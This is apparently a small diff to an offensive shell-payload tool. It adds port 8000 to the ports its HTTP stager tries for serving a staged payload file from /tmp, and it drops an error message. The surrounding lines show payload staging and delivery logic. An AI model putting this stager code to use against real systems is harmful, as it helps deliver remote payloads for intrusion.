@@ -743,7 +743,7 @@ will only increase the payload size."))
             else:
                 # This is the HTTP stager code.
                 # I will try to host a HTTP server in the following ports:
-                ports = [80, 8080, 8081]
+                ports = [80, 8080, 8081, 8000]
                 ports.insert(0, args.http_port) if args.http_port is not None else None
 
                 os.chdir("/tmp")  # currently only linux.
@@ -776,8 +776,7 @@ will only increase the payload size."))
                         print(info("Staged file has been named '{0}'".format(payload_file)))
                         stager_payload = shell.use_http_stager((args.host, port), args, payload_file).get()
                         break
-                    else:
-                        print(error("Cant use port {0} as HTTP server port.".format(port)))
+                        
 
     to_be_executed = shell.payload if stager is None else stager_payload
 
